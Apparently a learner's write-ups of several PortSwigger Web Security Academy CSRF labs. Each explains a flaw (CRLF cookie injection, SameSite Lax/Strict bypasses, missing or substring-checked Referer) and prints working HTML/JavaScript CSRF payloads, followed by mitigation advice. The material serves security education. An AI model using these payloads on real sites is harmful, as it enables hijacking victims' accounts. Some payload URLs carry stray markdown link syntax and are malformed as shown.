# 5th lab

#  Lab: CSRF where token is tied to non-session cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Broken Anti-CSRF Implementation + HTTP Header (CRLF) Injection.

##  The Concept
The application uses a double-submit or decoupled token mechanism. It validates the hidden `csrf` token against a separate `csrfKey` cookie, rather than tying the CSRF token directly to the user's `session` cookie. 
Because the application does not verify if the `csrfKey` cookie actually belongs to the current authenticated user, an attacker can exploit this if they find a way to inject a known `csrfKey` cookie into the victim's browser. Once the known cookie is planted, the attacker can submit a CSRF form containing the matching `csrf` token, bypassing the protection.

## Prerequisites
* A valid `csrfKey` cookie and a matching `csrf` token (obtained by logging into your own attacker account).
* A vulnerability on the target site that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection in a search parameter).

##  Step-by-Step Exploitation

### Step 1: Harvest Valid Tokens
1. Log in to the application with standard credentials (`wiener:peter`).
2. Observe the HTTP traffic in Burp Suite.
3. Note the value of the `csrfKey` cookie from any authenticated request.
4. Intercept the submission of the "Update email" form and note the value of the hidden `csrf` parameter in the body.

### Step 2: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site (e.g., `/?search=test`).
2. Observe the response: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by adding `%0d%0a` to the search term to append a new header:
   `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None`

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the cookie) and then immediately submits the CSRF form.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Anti-CSRF tokens must be strictly cryptographically tied to the user's active session identifier (e.g., the session cookie) on the server side. Additionally, applications must sanitize all user inputs reflected in HTTP headers to prevent CRLF injectio


# 6th lab

#  Lab: CSRF where token is duplicated in cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Flawed Double Submit Cookie Implementation + CRLF Injection.

##  The Concept
The application implements the "Double Submit Cookie" pattern for CSRF protection. It expects the CSRF token to be present in both a cookie and a hidden form field. 
However, the application only checks if the value in the cookie matches the value in the form parameter. It does not validate if the token is cryptographically valid or legally issued by the server. If an attacker can inject an arbitrary cookie into the victim's browser, they can simply invent a fake token, inject it via the cookie, and submit a CSRF payload containing the exact same fake token in the body.

##  Prerequisites
* A vulnerability that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection via a reflected search parameter).

##  Step-by-Step Exploitation

### Step 1: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site.
2. Observe the HTTP response setting a tracking cookie: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by injecting a new line (`%0d%0a`) into the search term to append a malicious CSRF cookie:
   `/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None`

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the `fake123` cookie) and then immediately submits the CSRF form with the matching `fake123` token.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="fake123">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. click the store and then deliver the exploit to victim
4. The lab is successfully solved

**key Takeaway**:The Double Submit Cookie pattern is inherently fragile if any subdomain or functional endpoint on the architecture has a cookie injection vulnerability. Servers should implement strict validation, tying the CSRF token cryptographically to the server-side session, rather than blindly comparing two client-provided values. 


# 7th lab


#  Lab: SameSite Lax bypass via method override
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Lax` restrictions to change the victim's email address using an exploit server.
**Vulnerability:** CSRF via HTTP Method Overriding bypassing SameSite=Lax cookie restrictions.

##  The Concept
Modern browsers enforce `SameSite=Lax` by default on cookies. This prevents cookies from being sent in cross-site `POST` requests, effectively mitigating standard CSRF attacks. However, `Lax` allows cookies to be sent during top-level navigations using safe HTTP methods like `GET`.
Many web frameworks support **HTTP Method Overriding** (e.g., using a `_method` parameter) to simulate unsupported HTTP methods. If a backend framework allows simulating a `POST` request via a `GET` request parameter (like `?_method=POST`), an attacker can force the victim's browser to make a top-level `GET` navigation. The browser includes the `Lax` cookie because it's a `GET` request, and the backend processes it as a state-changing `POST` request, bypassing the CSRF protection.

##  Prerequisites
* A target endpoint that performs state-changing actions via `POST`.
* A backend framework that supports HTTP Method Overriding via URL parameters (e.g., `_method=POST`).

##  Step-by-Step Exploitation

### Step 1: Verify Method Overriding
1. Capture a legitimate `POST` request to the target endpoint (e.g., `/my-account/change-email`).
2. Send the request to Burp Repeater.
3. Change the request method to `GET` and append the required parameters along with `_method=POST` to the URL.
   `GET /my-account/change-email?email=hacker@evil.com&_method=POST HTTP/2`
4. Send the request and verify if the action was successfully executed (e.g., receiving a `302 Found` redirecting back to the account page).

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft a simple HTML page with JavaScript that forces a top-level `GET` navigation to the vulnerable endpoint. This ensures the browser attaches the `SameSite=Lax` cookie.
   ```html
   <script>
       document.location = "[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST)";
   </script>
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Never allow state-changing operations to be executed via GET requests, even through framework features like Method Overriding. Backend systems should strictly enforce HTTP verbs and reject requests where the actual transport method (GET) contradicts the intended functional method (POST).

# 8th lab

#  Lab: SameSite Strict bypass via client-side redirect
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Strict` restrictions to change the victim's email address using a client-side redirect vulnerability.
**Vulnerability:** CSRF bypassing SameSite=Strict + Client-Side Open Redirect + Improper Method Validation.

## The Concept (The "Trojan Horse" Bypass)
The `SameSite=Strict` cookie attribute instructs the browser to never send the cookie in cross-site requests, effectively blocking standard CSRF attacks regardless of the HTTP method. 
However, if an attacker can find a client-side redirect vulnerability (where JavaScript on the target site reads a URL parameter and redirects the user via `window.location`), they can use the target application as a proxy. The attacker induces the victim to visit the vulnerable redirect endpoint. The initial cross-site request is sent without cookies. But when the target site's own JavaScript executes the redirect to the sensitive endpoint, the browser considers this a same-site navigation initiated by the application itself, and attaches the `Strict` cookies.

##  Prerequisites
* A sensitive state-changing endpoint that accepts `GET` requests (either directly or via method overriding).
* A client-side redirect vulnerability on the same domain that allows controlling the redirect destination path.

##  Step-by-Step Exploitation

### Step 1: Identify the Gadget (Client-Side Redirect)
1. Post a comment on any blog post and observe the redirection flow. 
2. The user is sent to `/post/comment/confirmation?postId=x`, which waits a few seconds and uses JavaScript to redirect the user to `/post/x`.
3. This is a client-side redirect where the destination is dynamically constructed from the `postId` query parameter.

### Step 2: Craft the Traversal Payload
1. We must redirect the user to the email change endpoint: `/my-account/change-email?email=hacker@evil.com&submit=1`.
2. By using directory traversal in the `postId` parameter, we can escape the `/post/` directory constraint:
   `1/../../my-account/change-email?email=hacker@evil.com%26submit=1`
   *(Note: The `&` character must be URL-encoded as `%26` so it isn't parsed as a separate parameter for the initial confirmation endpoint).*

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML page with JavaScript that forces the victim's browser to navigate to the vulnerable confirmation endpoint containing our traversal payload.
   ```html
   <script>
       document.location = "[https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@evil.com%26submit=1](https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@evil.com%26submit=1)";
   </script>
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved! 

**Key Takeaway / Mitigation**: To mitigate this, developers must properly sanitize inputs used in client-side redirects (preventing path traversal). More importantly, sensitive state-changing actions must never accept GET requests, rendering client-side GET redirects useless for CSRF.


# 7th lab

#  Lab: SameSite Lax bypass via cookie refresh
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Lax` restrictions to change the victim's email address by exploiting the browser's 2-minute cookie age exception.
**Vulnerability:** CSRF bypassing SameSite=Lax via Cookie Refresh (Browser quirk/exception).

## The Concept (The 2-Minute Window)
By default, modern browsers enforce `SameSite=Lax` on cookies, preventing them from being sent in cross-site `POST` requests. However, to prevent breaking Single Sign-On (SSO) mechanisms (like OAuth/SAML) where the Identity Provider redirects the user back to the application via a cross-site POST request, browsers like Chrome introduced a temporary exception: 
**If a cookie is less than 2 minutes old, the browser will NOT enforce the `Lax` restriction on top-level cross-site `POST` requests.** If an application has an endpoint (like `/social-login`) that refreshes the session cookie without requiring user interaction (if they are already authenticated), an attacker can force the victim to visit this endpoint to get a "fresh" cookie. Within the next 2 minutes, the attacker can successfully execute a standard cross-site CSRF `POST` attack, and the browser will attach the session cookie.

##  Prerequisites
* A target endpoint vulnerable to CSRF via `POST`.
* An endpoint that refreshes/re-issues the user's session cookie without requiring interaction (e.g., an OAuth `/social-login` flow that auto-redirects authenticated users).
* The ability to open pop-ups or trigger top-level navigations from the exploit server.

## Step-by-Step Exploitation

### Step 1: Identify the Refresh Endpoint
1. Observe the application's login flow.
2. Note that clicking "Social login" (or similar) hits an endpoint like `/social-login` and assigns a newly minted session cookie upon redirection back to the site.

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that performs two actions:
   * First, it opens a new window/tab to the cookie refresh endpoint (`/social-login`). This gives the victim a fresh cookie (age < 2 minutes).
   * Second, it waits for a short duration (e.g., 5 seconds to ensure the new cookie is set) and then auto-submits a CSRF `POST` form to the sensitive endpoint.
3. **Payload:**
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
       <input type="hidden" name="email" value="hacker@evil.com">
   </form>

   <script>
       // Trigger top-level navigation to refresh the session cookie
       window.open('[https://YOUR-LAB-ID.web-security-academy.net/social-login](https://YOUR-LAB-ID.web-security-academy.net/social-login)', 'refresh_window');

       // Wait 5 seconds for the cookie to be refreshed, then fire the POST request
       setTimeout(function() {
           document.getElementById('csrf-form').submit();
       }, 5000);
   </script>
   ```

### Step 3: Execute the Takedown
1. Click Store and then Deliver exploit to victim.

2. The victim bot visits the exploit, the popup refreshes their cookie, and 5 seconds later, the CSRF payload executes successfully within the 2-minute exception window.

3. The lab is successfully solved! 

**Key Takeaway / Mitigation**: This highlights why SameSite attributes are a "defense-in-depth" mechanism, not a silver bullet. Browsers have quirks and exceptions. Applications must still implement robust, cryptographically secure Anti-CSRF tokens for all state-changing operations, regardless of cookie attributes.


# 8TH Lab


#  Lab: CSRF where Referer validation depends on header being present
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass the `Referer` header validation to change the victim's email address using an exploit server.
**Vulnerability:** CSRF bypassing flawed `Referer` header validation.

##  The Concept (The Missing Header Logic Flaw)
Many applications validate the `Referer` header to ensure state-changing requests originate from their own domain, acting as an Anti-CSRF mechanism. However, a common logic flaw occurs when the validation is conditional upon the header's presence.
The logic often looks like this:
`if (Referer header exists) { validate it } else { allow request }`
This is done to accommodate legitimate users whose corporate proxies or strict browser privacy settings strip the `Referer` header. An attacker can exploit this "fail-open" logic by suppressing the `Referer` header entirely from their cross-site request. 

##  The Bypass Technique (Referrer Policy)
HTML5 introduced the `<meta>` tag for `referrer` policies, allowing web pages to control how much referer information is sent. By setting the policy to `no-referrer`, the attacker instructs the victim's browser to completely omit the `Referer` header when making the cross-site POST request.

##  Step-by-Step Exploitation

### Step 1: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload containing the CSRF POST form.
3. In the `<head>` of the HTML, inject the `<meta name="referrer" content="no-referrer">` tag. This is the crucial step that disables the header.
4. Add JavaScript to auto-submit the form.
   ```html
   <html>
       <head>
           <meta name="referrer" content="no-referrer">
       </head>
       <body>
           <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
               <input type="hidden" name="email" value="hacker@evil.com">
           </form>
           <script>
               document.getElementById('csrf-form').submit();
           </script>
       </body>
   </html>
   ```

### Step 2: Execute the Takedown
1. Click Store and then Deliver exploit to victim.
2. The browser executes the POST request without the Referer header. The server's flawed validation skips the check and processes the malicious email change.
3. The lab is successfully solved! 

**Key Takeaway / Mitigation**: Security validations should "fail-closed," not "fail-open." If an application relies on the Referer header for security, it must reject requests where the header is missing or empty. However, relying solely on headers is fragile; robust Anti-CSRF tokens remain the industry standard defense.


# 9th lab


#  Lab: CSRF with broken Referer validation
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass flawed `Referer` header validation using `history.pushState` and `unsafe-url` policy to execute a CSRF attack.
**Vulnerability:** CSRF bypassing flawed `Referer` validation (Substring/Regex logic flaw).

##  The Concept & Challenges
Some applications validate the `Referer` header by merely checking if the target domain exists *anywhere* within the URL string (e.g., using `indexOf`), rather than strictly parsing the hostname. Attackers can bypass this by placing the target domain in their Exploit Server's query string (e.g., `attacker.com/?target.com`).

**Two major challenges arise during exploitation:**
1. **Dynamic Delivery:** When delivering the exploit to a victim (or bot), they hit the root path of the exploit server, lacking the necessary query string.
2. **Browser Privacy Enforcement:** Modern browsers default to `strict-origin-when-cross-origin`, which strips the query string and path from the `Referer` header during cross-origin POST requests, destroying the payload.

##  The "Double Bypass" Technique
To successfully exploit this, we must combine Client-Side manipulation with Server-Side header overrides:
1. **`history.pushState()`:** A JavaScript API used to dynamically change the victim browser's URL (adding the target domain as a query string) *before* the CSRF form submits, without reloading the page.
2. **`Referrer-Policy: unsafe-url`:** An HTTP response header sent by the Exploit Server that overrides the browser's default privacy settings, forcing it to send the full, manipulated URL (including the query string) in the `Referer` header.

##  Step-by-Step Exploitation

### Step 1: Configure Exploit Server Headers
Navigate to the Exploit Server. In the **Head** section, inject the `Referrer-Policy` header to force the browser to send the full URL:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

### Step 2: Build the Exploit Body
In the Body section, create the CSRF auto-submit form and add the history.pushState JavaScript logic:
```
<form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="hacker@evil.com">
</form>

<script>
    // 1. Dynamically append the target domain to the Exploit Server's URL
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
    
    // 2. Auto-submit the form. The browser will now send the manipulated URL as the Referer.
    document.getElementById('csrf-form').submit();
</script>
```
### Step 3: Execute the Takedown
1. Ensure the target URL in both the <form action="..."> and the pushState string matches your active lab instance exactly.

2. Click Store to save the payload.

3. Click Deliver exploit to victim. The bot loads the page, its URL is manipulated, the privacy policy is overridden, and the flawed server accepts the spoofed Referer header. Lab Solved! 🎉

**Key Takeaway / Mitigation:** 
1. Referer validation should strictly parse the URL object and check the hostname property against an allowlist, never relying on simple string matching.
2. Attackers can easily manipulate the client-side environment (pushState) and browser behaviors (Referrer-Policy), proving that checking headers is insufficient. Robust Anti-CSRF tokens must be used.